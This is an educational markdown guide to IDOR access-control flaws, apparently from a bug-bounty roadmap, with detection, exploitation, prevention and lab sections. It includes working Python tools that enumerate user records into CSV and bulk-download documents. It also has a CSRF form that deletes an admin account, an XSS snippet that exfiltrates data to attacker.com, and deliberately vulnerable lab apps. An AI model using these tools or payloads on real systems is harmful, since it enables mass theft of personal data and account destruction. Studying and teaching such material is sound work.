# 🔐 Insecure Direct Object References (IDOR) - Complete Guide

> **The access control vulnerability that exposes sensitive data - Master IDOR detection and exploitation**

## 📚 Table of Contents
- [Introduction](#introduction)
- [Types of IDOR](#types-of-idor)
- [Detection Techniques](#detection-techniques)
- [Exploitation Methods](#exploitation-methods)
- [Advanced Techniques](#advanced-techniques)
- [Prevention & Mitigation](#prevention--mitigation)
- [Practice Labs](#practice-labs)
- [Real-World Examples](#real-world-examples)

## 🎯 Introduction

Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly, for example database records or files.

### 🔍 What Makes IDOR Dangerous?
- **Data exposure** - Access to sensitive user information
- **Privilege escalation** - Access to higher-privileged accounts
- **Financial impact** - Access to payment and billing information
- **Privacy violations** - Exposure of personal data
- **Business logic bypass** - Circumventing intended access controls

### 📊 IDOR Statistics
- **Found in 25%** of web applications during testing
- **Average bounty**: $500 - $2,500
- **Severity range**: Medium to High (depending on data exposed)
- **Time to exploit**: Minutes once identified
- **Easy to automate** - Simple parameter manipulation

## 🔬 Types of IDOR

### 1. 🎯 Numeric IDOR

The most common type where sequential numeric IDs are used to reference objects.

#### Example Vulnerable Code
```php
<?php
// Vulnerable: Direct database query with user input
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $user_id";
$result = mysqli_query($connection, $query);
$user_data = mysqli_fetch_assoc($result);
echo json_encode($user_data);
?>
```

#### Exploitation Example
```bash
# Original request
GET /api/user/123 HTTP/1.1
Host: vulnerable-app.com
Authorization: Bearer user123_token

# IDOR exploitation
GET /api/user/124 HTTP/1.1  # Access user 124's data
GET /api/user/125 HTTP/1.1  # Access user 125's data
GET /api/user/1 HTTP/1.1    # Access admin user's data
```

### 2. 🔤 String-Based IDOR

Uses string identifiers like usernames, email addresses, or UUIDs.

#### Example Scenarios
```bash
# Username-based IDOR
GET /profile/john_doe HTTP/1.1
GET /profile/admin HTTP/1.1

# Email-based IDOR
GET /api/user/john@example.com HTTP/1.1
GET /api/user/admin@company.com HTTP/1.1

# UUID-based IDOR (if predictable)
GET /document/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
```

### 3. 📁 File-Based IDOR

Direct access to files using predictable file paths or names.

#### File Access Examples
```bash
# Document access
GET /documents/invoice_123.pdf HTTP/1.1
GET /documents/invoice_124.pdf HTTP/1.1

# Image access
GET /uploads/user123/profile.jpg HTTP/1.1
GET /uploads/user124/profile.jpg HTTP/1.1

# Backup file access
GET /backups/database_2024_01_01.sql HTTP/1.1
```

## 🔍 Detection Techniques

### 1. 🎯 Manual Detection

#### Parameter Identification
```bash
# Common IDOR parameters
id=
user_id=
account_id=
doc_id=
file_id=
order_id=
invoice_id=
message_id=
post_id=
comment_id=
```

#### Basic IDOR Testing
```bash
# Step 1: Identify your own resource ID
GET /api/user/profile HTTP/1.1
Response: {"id": 123, "username": "testuser", "email": "test@example.com"}

# Step 2: Try accessing other IDs
GET /api/user/122 HTTP/1.1  # Previous user
GET /api/user/124 HTTP/1.1  # Next user
GET /api/user/1 HTTP/1.1    # Potential admin
GET /api/user/100 HTTP/1.1  # Random user
```

### 2. 🤖 Automated Detection

#### IDOR Scanner Tool
```python
#!/usr/bin/env python3
"""
Advanced IDOR Scanner

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import re
import json
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

class IDORScanner:
    def __init__(self, target_url, auth_headers=None):
        self.target_url = target_url
        self.auth_headers = auth_headers or {}
        self.session = requests.Session()
        self.session.headers.update(self.auth_headers)
        self.vulnerabilities = []
        self.tested_endpoints = set()
    
    def extract_ids_from_response(self, response_text):
        """Extract potential IDs from response"""
        id_patterns = [
            r'"id":\s*(\d+)',
            r'"user_id":\s*(\d+)',
            r'"account_id":\s*(\d+)',
            r'"doc_id":\s*(\d+)',
            r'id=(\d+)',
            r'/(\d+)(?:/|$)',
            r'["\']([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})["\']'  # UUIDs
        ]
        
        found_ids = []
        for pattern in id_patterns:
            matches = re.findall(pattern, response_text)
            found_ids.extend(matches)
        
        return list(set(found_ids))  # Remove duplicates
    
    def test_idor_endpoint(self, url, original_id, test_ids):
        """Test an endpoint for IDOR vulnerability"""
        original_response = None
        
        try:
            # Get original response
            original_response = self.session.get(url, timeout=10)
            original_status = original_response.status_code
            original_length = len(original_response.content)
            
            if original_status != 200:
                return  # Skip if original request fails
            
            # Test different IDs
            for test_id in test_ids:
                if test_id == original_id:
                    continue
                
                # Replace ID in URL
                test_url = url.replace(str(original_id), str(test_id))
                
                try:
                    test_response = self.session.get(test_url, timeout=10)
                    
                    # Analyze response for IDOR
                    if (test_response.status_code == 200 and 
                        len(test_response.content) > 0 and
                        test_response.content != original_response.content):
                        
                        # Check if response contains different user data
                        if self.is_different_user_data(original_response.text, test_response.text):
                            self.vulnerabilities.append({
                                'type': 'IDOR',
                                'original_url': url,
                                'vulnerable_url': test_url,
                                'original_id': original_id,
                                'accessed_id': test_id,
                                'severity': 'High',
                                'evidence': test_response.text[:200]
                            })
                            
                            print(f"[+] IDOR found: {test_url}")
                
                except Exception as e:
                    continue
                
                # Rate limiting
                time.sleep(0.1)
        
        except Exception as e:
            pass
    
    def is_different_user_data(self, original_text, test_text):
        """Check if response contains different user data"""
        # Look for indicators of different user data
        user_indicators = [
            r'"username":\s*"([^"]+)"',
            r'"email":\s*"([^"]+)"',
            r'"name":\s*"([^"]+)"',
            r'"phone":\s*"([^"]+)"'
        ]
        
        for pattern in user_indicators:
            original_matches = re.findall(pattern, original_text)
            test_matches = re.findall(pattern, test_text)
            
            if original_matches and test_matches:
                if original_matches != test_matches:
                    return True
        
        return False
    
    def generate_test_ids(self, original_id):
        """Generate test IDs based on original ID"""
        test_ids = []
        
        try:
            if original_id.isdigit():
                base_id = int(original_id)
                
                # Generate numeric variations
                test_ids.extend([
                    str(base_id - 1),
                    str(base_id + 1),
                    str(base_id - 10),
                    str(base_id + 10),
                    "1",  # Admin user
                    "2",
                    "100",
                    "1000"
                ])
            else:
                # For non-numeric IDs, try common variations
                test_ids.extend([
                    "admin",
                    "administrator",
                    "root",
                    "test",
                    "user1",
                    "user2"
                ])
        
        except:
            pass
        
        return test_ids
    
    def crawl_and_test(self, base_url):
        """Crawl application and test for IDOR"""
        try:
            response = self.session.get(base_url, timeout=10)
            
            # Extract potential endpoints with IDs
            endpoint_patterns = [
                r'href=["\']([^"\']*\/\d+[^"\']*)["\']',
                r'action=["\']([^"\']*\/\d+[^"\']*)["\']',
                r'["\']([^"\']*\/api\/[^"\']*\/\d+[^"\']*)["\']'
            ]
            
            endpoints = []
            for pattern in endpoint_patterns:
                matches = re.findall(pattern, response.text)
                endpoints.extend(matches)
            
            # Test each endpoint
            for endpoint in set(endpoints):
                if endpoint not in self.tested_endpoints:
                    self.tested_endpoints.add(endpoint)
                    
                    # Extract ID from endpoint
                    id_match = re.search(r'/(\d+)(?:/|$)', endpoint)
                    if id_match:
                        original_id = id_match.group(1)
                        test_ids = self.generate_test_ids(original_id)
                        
                        full_url = requests.compat.urljoin(base_url, endpoint)
                        self.test_idor_endpoint(full_url, original_id, test_ids)
        
        except Exception as e:
            pass
    
    def scan(self):
        """Run comprehensive IDOR scan"""
        print(f"[+] Starting IDOR scan for {self.target_url}")
        
        # Crawl and test the application
        self.crawl_and_test(self.target_url)
        
        return self.vulnerabilities

# Usage example
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Advanced IDOR Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-H", "--header", action="append", help="Custom headers (e.g., 'Authorization: Bearer token')")
    parser.add_argument("-o", "--output", help="Output file")
    args = parser.parse_args()
    
    # Parse custom headers
    headers = {}
    if args.header:
        for header in args.header:
            key, value = header.split(':', 1)
            headers[key.strip()] = value.strip()
    
    scanner = IDORScanner(args.url, headers)
    vulnerabilities = scanner.scan()
    
    if vulnerabilities:
        print(f"\n[+] Found {len(vulnerabilities)} IDOR vulnerabilities:")
        for vuln in vulnerabilities:
            print(f"  - {vuln['vulnerable_url']}")
    else:
        print("\n[-] No IDOR vulnerabilities found")
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(vulnerabilities, f, indent=2)

if __name__ == "__main__":
    main()
```

## ⚔️ Exploitation Methods

### 1. 📊 Data Enumeration

#### User Data Extraction
```python
#!/usr/bin/env python3
"""
IDOR Data Enumeration Tool

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import json
import time
import csv

class IDOREnumerator:
    def __init__(self, base_url, auth_headers):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update(auth_headers)
        self.extracted_data = []
    
    def enumerate_users(self, start_id=1, end_id=1000):
        """Enumerate user data via IDOR"""
        print(f"[+] Enumerating users from ID {start_id} to {end_id}")
        
        for user_id in range(start_id, end_id + 1):
            try:
                url = f"{self.base_url}/api/user/{user_id}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    try:
                        user_data = response.json()
                        
                        # Extract relevant information
                        extracted = {
                            'id': user_id,
                            'username': user_data.get('username', ''),
                            'email': user_data.get('email', ''),
                            'full_name': user_data.get('full_name', ''),
                            'phone': user_data.get('phone', ''),
                            'role': user_data.get('role', ''),
                            'created_at': user_data.get('created_at', ''),
                            'last_login': user_data.get('last_login', '')
                        }
                        
                        self.extracted_data.append(extracted)
                        print(f"[+] Found user {user_id}: {extracted['username']} ({extracted['email']})")
                    
                    except json.JSONDecodeError:
                        # Handle non-JSON responses
                        if len(response.text) > 0:
                            print(f"[+] Found user {user_id}: Non-JSON response")
                
                elif response.status_code == 403:
                    print(f"[-] Access denied for user {user_id}")
                
                # Rate limiting
                time.sleep(0.1)
            
            except Exception as e:
                continue
        
        return self.extracted_data
    
    def save_to_csv(self, filename):
        """Save extracted data to CSV"""
        if not self.extracted_data:
            return
        
        with open(filename, 'w', newline='') as csvfile:
            fieldnames = self.extracted_data[0].keys()
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for row in self.extracted_data:
                writer.writerow(row)
        
        print(f"[+] Data saved to {filename}")

# Usage
headers = {'Authorization': 'Bearer your_token_here'}
enumerator = IDOREnumerator("https://vulnerable-app.com", headers)
data = enumerator.enumerate_users(1, 100)
enumerator.save_to_csv("extracted_users.csv")
```

### 2. 💰 Financial Data Access

#### Invoice and Payment IDOR
```bash
# Invoice access
GET /api/invoice/12345 HTTP/1.1
Authorization: Bearer user_token

# Try accessing other invoices
GET /api/invoice/12346 HTTP/1.1
GET /api/invoice/12344 HTTP/1.1

# Payment information
GET /api/payment/67890 HTTP/1.1
GET /api/payment/67891 HTTP/1.1

# Bank account details
GET /api/account/details/98765 HTTP/1.1
```

### 3. 📄 Document and File Access

#### Document IDOR Exploitation
```python
#!/usr/bin/env python3
"""
Document IDOR Exploitation Tool

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import os
from urllib.parse import urlparse

class DocumentIDOR:
    def __init__(self, base_url, auth_headers):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update(auth_headers)
        self.downloaded_files = []
    
    def test_document_access(self, doc_id_range):
        """Test access to documents via IDOR"""
        for doc_id in doc_id_range:
            endpoints = [
                f"/api/document/{doc_id}",
                f"/documents/{doc_id}.pdf",
                f"/files/document_{doc_id}.pdf",
                f"/download/{doc_id}",
                f"/api/file/{doc_id}/download"
            ]
            
            for endpoint in endpoints:
                try:
                    url = f"{self.base_url}{endpoint}"
                    response = self.session.get(url, timeout=10)
                    
                    if response.status_code == 200:
                        # Check if it's a file
                        content_type = response.headers.get('content-type', '')
                        
                        if ('pdf' in content_type or 
                            'document' in content_type or
                            'application/octet-stream' in content_type):
                            
                            filename = f"document_{doc_id}.pdf"
                            self.save_file(response.content, filename)
                            
                            print(f"[+] Downloaded: {filename}")
                            self.downloaded_files.append(filename)
                        
                        elif response.text and len(response.text) > 100:
                            print(f"[+] Accessible document {doc_id}: {url}")
                
                except Exception as e:
                    continue
    
    def save_file(self, content, filename):
        """Save downloaded file"""
        os.makedirs("downloaded_docs", exist_ok=True)
        filepath = os.path.join("downloaded_docs", filename)
        
        with open(filepath, 'wb') as f:
            f.write(content)

# Usage
headers = {'Authorization': 'Bearer your_token_here'}
doc_idor = DocumentIDOR("https://vulnerable-app.com", headers)
doc_idor.test_document_access(range(1000, 2000))
```

## 🚀 Advanced IDOR Techniques

### 1. 🔄 Indirect IDOR

Sometimes IDOR vulnerabilities are not directly visible but can be exploited through indirect methods.

#### Indirect IDOR Examples
```bash
# Step 1: Get list of accessible resources
GET /api/user/profile HTTP/1.1
Response: {"user_id": 123, "documents": [{"id": 456, "name": "contract.pdf"}]}

# Step 2: Use document ID from another user's profile
GET /api/document/789 HTTP/1.1  # Document ID from user 124's profile
```

### 2. 🎭 Blind IDOR

IDOR vulnerabilities where you can't see the response but can infer success through side channels.

#### Blind IDOR Detection
```python
#!/usr/bin/env python3
"""
Blind IDOR Detection Tool

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import time

class BlindIDORDetector:
    def __init__(self, target_url, auth_headers):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update(auth_headers)
    
    def test_blind_idor(self, endpoint_template, id_range):
        """Test for blind IDOR using timing and status codes"""
        baseline_times = []
        
        # Establish baseline timing
        for _ in range(5):
            start_time = time.time()
            try:
                response = self.session.get(f"{self.target_url}/api/nonexistent/999999")
                end_time = time.time()
                baseline_times.append(end_time - start_time)
            except:
                pass
        
        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0
        
        # Test ID range
        for test_id in id_range:
            start_time = time.time()
            
            try:
                url = endpoint_template.format(id=test_id)
                response = self.session.get(url, timeout=10)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # Analyze response
                if response.status_code == 200:
                    print(f"[+] Potential IDOR: {url} (Status: 200)")
                
                elif response.status_code == 403:
                    print(f"[+] Forbidden resource exists: {url} (Status: 403)")
                
                elif response_time > (avg_baseline * 2):
                    print(f"[+] Slow response (potential processing): {url} (Time: {response_time:.2f}s)")
                
                # Check for different response lengths
                if hasattr(self, 'baseline_length'):
                    if abs(len(response.content) - self.baseline_length) > 100:
                        print(f"[+] Different response length: {url}")
                else:
                    self.baseline_length = len(response.content)
            
            except Exception as e:
                continue
            
            time.sleep(0.1)  # Rate limiting

# Usage
detector = BlindIDORDetector("https://target.com", {"Authorization": "Bearer token"})
detector.test_blind_idor("https://target.com/api/user/{id}/delete", range(1, 100))
```

### 3. 🔗 IDOR Chaining

Combining IDOR with other vulnerabilities for greater impact.

#### IDOR + CSRF Chain
```html
<!-- CSRF form that exploits IDOR -->
<form id="idor-csrf" action="https://vulnerable-app.com/api/user/1/delete" method="POST">
    <input type="hidden" name="confirm" value="true">
</form>

<script>
// Automatically submit form to delete admin user (ID: 1)
document.getElementById('idor-csrf').submit();
</script>
```

#### IDOR + XSS Chain
```javascript
// Use XSS to exploit IDOR and extract data
fetch('/api/user/1')  // Admin user
    .then(response => response.json())
    .then(data => {
        // Exfiltrate admin data
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
```

## 🛡️ Prevention & Mitigation

### 1. 🔒 Access Control Implementation

#### Secure Code Examples
```php
<?php
// Secure implementation with proper access control
function getUserData($requested_user_id) {
    $current_user_id = getCurrentUserId();
    $current_user_role = getCurrentUserRole();
    
    // Check if user can access this resource
    if ($current_user_id != $requested_user_id && $current_user_role != 'admin') {
        throw new UnauthorizedException("Access denied");
    }
    
    // Use parameterized query
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? AND (id = ? OR ? = 'admin')");
    $stmt->execute([$requested_user_id, $current_user_id, $current_user_role]);
    
    return $stmt->fetch();
}
?>
```

```python
# Python/Django secure implementation
from django.contrib.auth.decorators import login_required
from django.core.exceptions import PermissionDenied
from django.shortcuts import get_object_or_404

@login_required
def get_user_profile(request, user_id):
    # Check if user can access this profile
    if request.user.id != user_id and not request.user.is_staff:
        raise PermissionDenied("You can only access your own profile")
    
    # Use Django ORM with proper filtering
    user = get_object_or_404(User, id=user_id)
    
    # Additional check at object level
    if not user.can_be_viewed_by(request.user):
        raise PermissionDenied("Access denied")
    
    return JsonResponse(user.to_dict())
```

### 2. 🎲 Indirect Object References

#### Using UUIDs Instead of Sequential IDs
```python
import uuid
from django.db import models

class User(models.Model):
    # Use UUID instead of sequential ID
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    username = models.CharField(max_length=100)
    email = models.EmailField()
    
    def __str__(self):
        return self.username

# Usage in views
def get_user_profile(request, user_uuid):
    try:
        user = User.objects.get(id=user_uuid)
        # Still need access control checks
        if not user.can_be_viewed_by(request.user):
            raise PermissionDenied("Access denied")
        return JsonResponse(user.to_dict())
    except User.DoesNotExist:
        return JsonResponse({"error": "User not found"}, status=404)
```

### 3. 🔐 Authorization Middleware

#### Comprehensive Authorization System
```python
#!/usr/bin/env python3
"""
Authorization Middleware for IDOR Prevention

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

from functools import wraps
from flask import request, jsonify, g
import re

class AuthorizationMiddleware:
    def __init__(self):
        self.resource_patterns = {
            r'/api/user/(\d+)': self.check_user_access,
            r'/api/document/(\d+)': self.check_document_access,
            r'/api/invoice/(\d+)': self.check_invoice_access,
        }
    
    def check_user_access(self, resource_id, current_user):
        """Check if user can access user resource"""
        if current_user.role == 'admin':
            return True
        
        return str(current_user.id) == str(resource_id)
    
    def check_document_access(self, resource_id, current_user):
        """Check if user can access document"""
        # Get document from database
        document = Document.query.get(resource_id)
        if not document:
            return False
        
        # Check ownership or admin access
        return (document.owner_id == current_user.id or 
                current_user.role == 'admin')
    
    def check_invoice_access(self, resource_id, current_user):
        """Check if user can access invoice"""
        invoice = Invoice.query.get(resource_id)
        if not invoice:
            return False
        
        # Check ownership, admin access, or accountant role
        return (invoice.user_id == current_user.id or 
                current_user.role in ['admin', 'accountant'])
    
    def authorize_request(self, path, current_user):
        """Authorize request based on path and user"""
        for pattern, check_function in self.resource_patterns.items():
            match = re.match(pattern, path)
            if match:
                resource_id = match.group(1)
                return check_function(resource_id, current_user)
        
        return True  # Allow if no specific pattern matches

def require_authorization(f):
    """Decorator to enforce authorization"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_middleware = AuthorizationMiddleware()
        
        if not auth_middleware.authorize_request(request.path, g.current_user):
            return jsonify({"error": "Access denied"}), 403
        
        return f(*args, **kwargs)
    
    return decorated_function

# Usage in Flask routes
@app.route('/api/user/<int:user_id>')
@require_authorization
def get_user(user_id):
    user = User.query.get_or_404(user_id)
    return jsonify(user.to_dict())
```

## 🧪 Practice Labs

### 1. 🎓 Beginner Labs

#### PortSwigger Web Security Academy - Access Control Labs
```
1. Unprotected admin functionality
2. Unprotected admin functionality with unpredictable URL
3. User role controlled by request parameter
4. User role can be modified in user profile
5. User ID controlled by request parameter
6. User ID controlled by request parameter, with unpredictable user IDs
7. User ID controlled by request parameter with data leakage in redirect
8. User ID controlled by request parameter with password disclosure
```

#### TryHackMe IDOR Challenges
```bash
# Access TryHackMe IDOR room
https://tryhackme.com/room/idor

# Topics covered:
- Basic IDOR concepts
- Numeric ID manipulation
- Encoded ID bypass
- Hashed ID prediction
```

### 2. 🔬 Intermediate Labs

#### Custom IDOR Lab Setup
```php
<?php
// vulnerable-idor-lab.php
session_start();

// Simple authentication
if (!isset($_SESSION['user_id'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Hardcoded users for demo
        $users = [
            'user1' => ['id' => 1, 'password' => 'pass1', 'role' => 'user'],
            'user2' => ['id' => 2, 'password' => 'pass2', 'role' => 'user'],
            'admin' => ['id' => 3, 'password' => 'admin', 'role' => 'admin']
        ];
        
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        if (isset($users[$username]) && $users[$username]['password'] === $password) {
            $_SESSION['user_id'] = $users[$username]['id'];
            $_SESSION['username'] = $username;
            $_SESSION['role'] = $users[$username]['role'];
        }
    }
    
    if (!isset($_SESSION['user_id'])) {
        echo '<form method="POST">
                Username: <input name="username" type="text">
                Password: <input name="password" type="password">
                <input type="submit" value="Login">
              </form>';
        exit;
    }
}

// Vulnerable user profile endpoint
if (isset($_GET['user_id'])) {
    $requested_id = $_GET['user_id'];
    
    // Vulnerable: No access control check
    $user_data = [
        1 => ['name' => 'John Doe', 'email' => 'john@example.com', 'ssn' => '123-45-6789'],
        2 => ['name' => 'Jane Smith', 'email' => 'jane@example.com', 'ssn' => '987-65-4321'],
        3 => ['name' => 'Admin User', 'email' => 'admin@example.com', 'ssn' => '555-55-5555']
    ];
    
    if (isset($user_data[$requested_id])) {
        echo "<h2>User Profile (ID: $requested_id)</h2>";
        echo "<p>Name: " . $user_data[$requested_id]['name'] . "</p>";
        echo "<p>Email: " . $user_data[$requested_id]['email'] . "</p>";
        echo "<p>SSN: " . $user_data[$requested_id]['ssn'] . "</p>";
    } else {
        echo "User not found";
    }
} else {
    echo "<h2>Welcome, " . $_SESSION['username'] . "</h2>";
    echo "<p>Your user ID: " . $_SESSION['user_id'] . "</p>";
    echo "<a href='?user_id=" . $_SESSION['user_id'] . "'>View Profile</a>";
}
?>
```

### 3. 🚀 Advanced Labs

#### Multi-Step IDOR Challenge
```python
#!/usr/bin/env python3
"""
Advanced IDOR Challenge Setup

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

from flask import Flask, request, jsonify, session
import uuid
import hashlib

app = Flask(__name__)
app.secret_key = 'vulnerable_secret_key'

# Mock database
users = {
    1: {'username': 'user1', 'email': 'user1@example.com', 'role': 'user', 'api_key': 'key1'},
    2: {'username': 'user2', 'email': 'user2@example.com', 'role': 'user', 'api_key': 'key2'},
    3: {'username': 'admin', 'email': 'admin@example.com', 'role': 'admin', 'api_key': 'admin_key'}
}

documents = {
    101: {'title': 'User1 Document', 'owner_id': 1, 'content': 'User1 private content'},
    102: {'title': 'User2 Document', 'owner_id': 2, 'content': 'User2 private content'},
    103: {'title': 'Admin Document', 'owner_id': 3, 'content': 'Admin secret content'}
}

@app.route('/api/user/<int:user_id>')
def get_user(user_id):
    # Vulnerable: No access control
    if user_id in users:
        return jsonify(users[user_id])
    return jsonify({'error': 'User not found'}), 404

@app.route('/api/document/<int:doc_id>')
def get_document(doc_id):
    # Vulnerable: No ownership check
    if doc_id in documents:
        return jsonify(documents[doc_id])
    return jsonify({'error': 'Document not found'}), 404

@app.route('/api/user/<int:user_id>/documents')
def get_user_documents(user_id):
    # Vulnerable: Can access any user's document list
    user_docs = [doc for doc in documents.values() if doc['owner_id'] == user_id]
    return jsonify(user_docs)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```

## 🌍 Real-World Examples

### 1. 💰 High-Value Bug Bounty Reports

#### Facebook IDOR ($4,500)
- **Vulnerability**: IDOR in Facebook Pages management
- **Vector**: Page ID manipulation in API calls
- **Impact**: Access to other pages' analytics and settings
- **Technique**: Sequential ID enumeration
- **Key Learning**: Even large platforms can have IDOR vulnerabilities

#### Shopify IDOR ($1,000)
- **Vulnerability**: IDOR in order management system
- **Vector**: Order ID manipulation
- **Impact**: Access to other customers' order details
- **Technique**: Predictable order ID pattern
- **Key Learning**: E-commerce platforms are high-value IDOR targets

#### Twitter IDOR ($7,560)
- **Vulnerability**: IDOR in Twitter Ads API
- **Vector**: Campaign ID manipulation
- **Impact**: Access to other advertisers' campaign data
- **Technique**: API endpoint enumeration
- **Key Learning**: API endpoints often lack proper access controls

### 2. 📊 Common IDOR Patterns

#### E-commerce Applications
```bash
# Order access
GET /api/order/12345 HTTP/1.1
GET /api/order/12346 HTTP/1.1  # Next order

# Invoice access
GET /invoice/INV-2024-001 HTTP/1.1
GET /invoice/INV-2024-002 HTTP/1.1

# Payment methods
GET /api/payment-method/567 HTTP/1.1
```

#### Social Media Platforms
```bash
# Profile access
GET /api/profile/user123 HTTP/1.1
GET /api/profile/user124 HTTP/1.1

# Private messages
GET /api/message/789 HTTP/1.1
GET /api/message/790 HTTP/1.1

# Photo access
GET /api/photo/private/456 HTTP/1.1
```

#### Healthcare Applications
```bash
# Patient records (highly sensitive)
GET /api/patient/12345 HTTP/1.1
GET /api/patient/12346 HTTP/1.1

# Medical reports
GET /api/report/medical/789 HTTP/1.1
```

## 🔧 Tools and Resources

### 🛠️ Essential IDOR Tools

#### Burp Suite Extensions
```
1. Autorize - Automated authorization testing
2. AuthMatrix - Authorization matrix testing
3. Auto Repeater - Automated request manipulation
4. Param Miner - Hidden parameter discovery
```

#### Standalone Tools
```bash
# IDORer - IDOR testing tool
git clone https://github.com/M4DM0e/IDORer
python3 IDORer.py -u https://target.com/api/user/123

# Arjun - Parameter discovery
arjun -u https://target.com/api/endpoint

# Custom scripts for automation
python3 idor_scanner.py -u https://target.com -r 1-1000
```

### 📚 Learning Resources

#### Books
- **The Web Application Hacker's Handbook** - Chapter 8: Attacking Access Controls
- **Real-World Bug Hunting** - IDOR case studies
- **OWASP Testing Guide** - Access control testing

#### Online Resources
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [PortSwigger Access Control Tutorial](https://portswigger.net/web-security/access-control)
- [IDOR Vulnerability Examples](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)

## 🎯 Key Takeaways

### ✅ Essential Skills to Master
- [ ] **Detection**: Identify IDOR vulnerabilities in various contexts
- [ ] **Enumeration**: Systematically extract data through IDOR
- [ ] **Automation**: Build tools for large-scale IDOR testing
- [ ] **Chaining**: Combine IDOR with other vulnerabilities
- [ ] **Impact Assessment**: Understand business impact of data exposure

### 🚀 Advanced Techniques to Learn
- [ ] **Blind IDOR detection** - Identify IDOR without direct feedback
- [ ] **Indirect object references** - Find IDOR through complex relationships
- [ ] **UUID prediction** - Attack non-sequential identifiers
- [ ] **Authorization bypass** - Circumvent access control mechanisms
- [ ] **Mass data extraction** - Efficiently enumerate large datasets

### 💡 Pro Tips for Bug Bounty Hunters
1. **Test all ID parameters** - user_id, doc_id, order_id, etc.
2. **Try different ID formats** - numeric, UUID, encoded, hashed
3. **Look for indirect references** - IDs in other users' data
4. **Test different HTTP methods** - GET, POST, PUT, DELETE
5. **Check for partial access** - Some fields might be accessible
6. **Automate enumeration** - Use tools for large-scale testing
7. **Focus on sensitive data** - Financial, medical, personal information
8. **Document impact clearly** - Show what data can be accessed

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**⚖️ Legal Reminder**: Only test IDOR on systems you own or have explicit permission to test. Always follow responsible disclosure practices and respect bug bounty program rules.

**🎯 Next Steps**: Practice on the provided labs, study real-world examples, and focus on understanding access control mechanisms. IDOR mastery comes with systematic testing and understanding application logic.

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*